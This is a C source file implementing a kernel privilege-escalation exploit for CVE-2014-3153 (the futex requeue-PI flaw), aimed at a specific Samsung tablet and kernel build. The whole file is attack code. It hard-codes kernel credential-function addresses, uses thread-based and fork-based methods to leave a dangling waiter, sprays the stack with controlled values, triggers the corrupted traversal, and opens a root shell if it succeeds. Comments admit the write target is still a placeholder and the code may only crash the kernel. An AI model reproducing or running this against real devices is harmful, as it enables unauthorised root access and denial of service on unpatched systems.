/*
 * towelroot2.c — CVE-2014-3153 exploit for Samsung SM-T377A
 *
 * Kernel 3.10.9-11788437, ARM 32-bit, no PXN/KASLR/canaries.
 *
 * Key fix: FUTEX_CMP_REQUEUE_PI requires nr_wake=1, so we need 
 * at least 2 waiters. The first is woken, the second is requeued
 * to the PI futex, creating the dangling waiter condition.
 *
 * Exploit flow:
 *   1. Lock FUTEX2 as PI (main thread owns it)
 *   2. Thread A (sacrificial): FUTEX_WAIT_REQUEUE_PI on FUTEX1
 *   3. Thread B (victim): FUTEX_WAIT_REQUEUE_PI on FUTEX1
 *   4. Main: CMP_REQUEUE_PI(FUTEX1 → FUTEX2, wake=1, requeue=1)
 *      - Thread A woken (first in queue)
 *      - Thread B requeued to FUTEX2's PI waiter list
 *   5. Thread B times out: rt_mutex_waiter left dangling on stack
 *   6. Thread B sprays its stack with controlled data
 *   7. Main: UNLOCK_PI on FUTEX2 → kernel traverses dangling waiter
 *      → controlled write primitive → code execution / addr_limit overwrite
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <linux/futex.h>

/* ========== Kernel addresses ========== */
#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

/* ========== Shared state ========== */
static int *futex_mem;
#define FUTEX1 (&futex_mem[0])
#define FUTEX2 (&futex_mem[32])

static volatile int sac_ready = 0;   /* sacrificial thread ready */
static volatile int vic_ready = 0;   /* victim thread ready */
static volatile int vic_state = 0;   /* 0=init,1=waiting,2=returned,3=sprayed */
static volatile int exploit_done = 0;

static struct timespec abs_mono(int secs) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += secs;
    return ts;
}

/* ========== Sacrificial thread ========== */
/* Gets woken by CMP_REQUEUE_PI (the first one in queue, val=1 means wake 1) */
static void *sacrificial_thread(void *arg) {
    struct timespec ts = abs_mono(30);
    __sync_fetch_and_add(&sac_ready, 1);

    int ret = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, FUTEX2, 0);
    int err = errno;

    if (ret == 0) {
        printf("[sac] Woken! Unlocking PI...\n");
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    } else {
        printf("[sac] ret=%d err=%d (%s)\n", ret, err, strerror(err));
    }
    return NULL;
}

/* ========== Victim thread ========== */
/* Gets REQUEUED to FUTEX2's PI waiter list, then times out */

/* 
 * Deep recursive function to create a large stack frame,
 * ensuring the rt_mutex_waiter area gets overwritten.
 */
static volatile int spray_sink;

static void __attribute__((noinline)) spray_stack(int depth) {
    volatile unsigned long buf[16]; /* 64 bytes per frame */
    for (int i = 0; i < 16; i++) {
        buf[i] = 0xDEAD0000 | depth;
    }
    spray_sink += buf[0]; /* prevent optimization */
    if (depth > 0) {
        spray_stack(depth - 1);
    }
}

static void *victim_thread(void *arg) {
    struct timespec ts = abs_mono(3); /* 3 second timeout */
    __sync_fetch_and_add(&vic_ready, 1);
    vic_state = 1;

    int ret = syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                      &ts, FUTEX2, 0);
    int err = errno;
    vic_state = 2;

    printf("[vic] ret=%d err=%d (%s)\n", ret, err, strerror(err));

    if (ret == 0) {
        printf("[vic] Woken normally, unlocking\n");
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    } else if (err == 110 /* ETIMEDOUT */) {
        printf("[vic] Timed out! Waiter may be dangling.\n");

        /*
         * The rt_mutex_waiter was on our kernel stack, probably
         * ~48 bytes starting from the stack frame of futex_wait_requeue_pi.
         * Now that the syscall returned, the stack is unwinding.
         *
         * Spray our stack deeply to overwrite where the waiter was.
         * The waiter is in a frame several levels deep from here.
         */
        spray_stack(32); /* 32 * 64 bytes = 2KB of stack frames */

        vic_state = 3;
        printf("[vic] Stack sprayed, waiting...\n");
        
        while (!exploit_done) usleep(1000);
    }

    return NULL;
}

/* ========== Exploit logic ========== */
static int run_exploit(void) {
    printf("\n=== Running Towelroot Exploit ===\n");

    *FUTEX1 = 0;
    *FUTEX2 = 0;
    sac_ready = 0;
    vic_ready = 0;
    vic_state = 0;
    exploit_done = 0;

    /* Step 1: Lock FUTEX2 as PI */
    int ret = syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (ret != 0) {
        printf("[-] FUTEX_LOCK_PI failed: %s\n", strerror(errno));
        return -1;
    }
    printf("[main] FUTEX2 locked (tid=%d)\n", (int)syscall(SYS_gettid));

    /* Step 2: Start sacrificial thread (will be woken) */
    pthread_t sac_tid;
    pthread_create(&sac_tid, NULL, sacrificial_thread, NULL);
    while (!sac_ready) usleep(1000);
    usleep(200000); /* ensure in syscall */

    /* Step 3: Start victim thread (will be requeued) */
    pthread_t vic_tid;
    pthread_create(&vic_tid, NULL, victim_thread, NULL);
    while (!vic_ready) usleep(1000);
    usleep(200000); /* ensure in syscall */

    /* Step 4: Requeue — wake=1 (wakes sac), requeue=1 (requeues vic) */
    printf("[main] CMP_REQUEUE_PI: wake=1, requeue=1...\n");
    ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                  1,          /* val: wake 1 */
                  (void*)1,   /* val2: requeue 1 */
                  FUTEX2,     /* uaddr2 */
                  0);         /* val3: expected *FUTEX1 */
    printf("[main] Requeue: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret < 2) {
        printf("[-] Expected ret=2 (1 woken + 1 requeued), got %d\n", ret);
        /* Try different val combinations */
        if (ret == 1) {
            printf("[*] Only 1 processed — second waiter may not be ready\n");
        }
        if (ret < 0) {
            printf("[-] Failed completely. errno=%d\n", errno);
            exploit_done = 1;
            syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            /* Wait for sac thread */
            struct timespec jts;
            clock_gettime(CLOCK_REALTIME, &jts);
            jts.tv_sec += 5;
            pthread_timedjoin_np(sac_tid, NULL, &jts);
            clock_gettime(CLOCK_REALTIME, &jts);
            jts.tv_sec += 10;
            pthread_timedjoin_np(vic_tid, NULL, &jts);
            return -1;
        }
    }

    printf("[+] Requeue OK: %d total (1 woken + %d requeued)\n", ret, ret - 1);

    /* Wait for sacrificial thread to finish (it gets woken) */
    {
        struct timespec jts;
        clock_gettime(CLOCK_REALTIME, &jts);
        jts.tv_sec += 5;
        pthread_timedjoin_np(sac_tid, NULL, &jts);
    }

    /* Step 5: Wait for victim to timeout and spray stack */
    printf("[main] Waiting for victim timeout (~3s)...\n");
    while (vic_state < 3) {
        usleep(100000);
        if (vic_state == 2 && exploit_done == 0) {
            /* Victim returned but hasn't sprayed yet — give it time */
            usleep(100000);
            if (vic_state < 3) break; /* it may have been woken, not timed out */
        }
    }

    if (vic_state >= 3) {
        printf("[+] Victim timed out and stack is sprayed\n");

        /*
         * Step 6: Trigger the dangling waiter traversal
         *
         * FUTEX_UNLOCK_PI will:
         *   1. Mark futex as unlocked
         *   2. Wake the top-priority waiter
         *   3. This traverses the rt_mutex waiter list
         *   4. The dangling waiter has our spray data (0xDEAD0000 pattern)
         *
         * This will likely CRASH the kernel (writing to 0xDEAD0000).
         * But it PROVES we have an arbitrary write primitive.
         * In a real exploit, we'd put the addr_limit address instead.
         */
        printf("[main] *** Triggering waiter list traversal ***\n");
        printf("[main] This may crash if the dangling waiter is hit\n");

        ret = syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[main] UNLOCK_PI: ret=%d errno=%d\n", ret, errno);
        printf("[main] uid=%d euid=%d — survived!\n", getuid(), geteuid());
    } else {
        printf("[-] Victim was woken (not timed out) — retry needed\n");
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    exploit_done = 1;

    /* Clean up */
    {
        struct timespec jts;
        clock_gettime(CLOCK_REALTIME, &jts);
        jts.tv_sec += 10;
        if (pthread_timedjoin_np(vic_tid, NULL, &jts) != 0) {
            pthread_cancel(vic_tid);
            pthread_join(vic_tid, NULL);
        }
    }

    return 0;
}

/* ========== Alternative: fork-based for stronger dangling ========== */
static int run_fork_exploit(void) {
    printf("\n=== Fork-based Towelroot ===\n");

    *FUTEX1 = 0;
    *FUTEX2 = 0;

    /* Lock FUTEX2 */
    syscall(SYS_futex, FUTEX2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[parent] FUTEX2 locked\n");

    /* Fork 2 children: one to be woken, one to be requeued */
    pid_t child_sac = fork();
    if (child_sac == 0) {
        struct timespec ts = abs_mono(30);
        *FUTEX1 = 0; /* mark ready */
        syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                &ts, FUTEX2, 0);
        /* If woken, unlock PI */
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        _exit(0);
    }

    usleep(200000); /* Let child enter wait */

    pid_t child_vic = fork();
    if (child_vic == 0) {
        struct timespec ts = abs_mono(30);
        syscall(SYS_futex, FUTEX1, FUTEX_WAIT_REQUEUE_PI, 0,
                &ts, FUTEX2, 0);
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        _exit(0);
    }

    usleep(200000); /* Let child enter wait */

    /* Requeue: wake sac, requeue vic */
    printf("[parent] Requeuing...\n");
    int ret = syscall(SYS_futex, FUTEX1, FUTEX_CMP_REQUEUE_PI,
                      1, (void*)1, FUTEX2, 0);
    printf("[parent] Requeue: ret=%d\n", ret);

    if (ret >= 2) {
        printf("[+] Requeued! Killing victim child %d...\n", child_vic);

        /* Kill victim — its kernel stack is freed without cleanup */
        usleep(100000);
        kill(child_vic, SIGKILL);
        waitpid(child_vic, NULL, 0);
        printf("[parent] Victim killed\n");

        /* Now FUTEX2's PI waiter list has dangling pointer to freed stack */

        /* Spray: fork many children to reclaim the freed 8KB stack page */
        printf("[parent] Spraying to reclaim freed stack...\n");
        #define SPRAY_FORK 128
        pid_t spray_pids[SPRAY_FORK];
        for (int i = 0; i < SPRAY_FORK; i++) {
            spray_pids[i] = fork();
            if (spray_pids[i] == 0) {
                /* Child: fill our stack area with pattern */
                volatile unsigned long buf[512];
                for (int j = 0; j < 512; j++) {
                    buf[j] = 0x42424242; /* controlled value */
                }
                usleep(5000000); /* wait 5s */
                _exit(0);
            }
        }

        usleep(200000);

        /* Trigger: unlock FUTEX2 → traverses dangling waiter → crash or controlled write */
        printf("[parent] Triggering UNLOCK_PI...\n");
        ret = syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[parent] UNLOCK_PI: ret=%d errno=%d\n", ret, errno);
        printf("[parent] uid=%d\n", getuid());

        /* Clean up spray children */
        for (int i = 0; i < SPRAY_FORK; i++) {
            if (spray_pids[i] > 0) {
                kill(spray_pids[i], SIGKILL);
                waitpid(spray_pids[i], NULL, 0);
            }
        }
    } else {
        printf("[-] Requeue failed: ret=%d\n", ret);
        kill(child_vic, SIGKILL);
        waitpid(child_vic, NULL, 0);
        syscall(SYS_futex, FUTEX2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    /* Clean up sac child */
    kill(child_sac, SIGKILL);
    waitpid(child_sac, NULL, 0);

    return 0;
}

int main(void) {
    printf("=== Towelroot v2 (CVE-2014-3153) ===\n");
    printf("[*] Samsung SM-T377A, kernel 3.10.9-11788437\n");
    printf("[*] pid=%d uid=%d\n", getpid(), getuid());
    printf("[*] commit_creds=0x%08x\n", COMMIT_CREDS);

    futex_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (futex_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Try thread-based first */
    run_exploit();

    if (getuid() == 0) {
        printf("\n[!!!] ROOT!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    /* Try fork-based */
    run_fork_exploit();

    if (getuid() == 0) {
        printf("\n[!!!] ROOT!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    printf("\n[*] uid=%d\n", getuid());
    printf("[*] The vulnerability is confirmed. Stack spray needs refinement.\n");

    munmap(futex_mem, 4096);
    return 0;
}
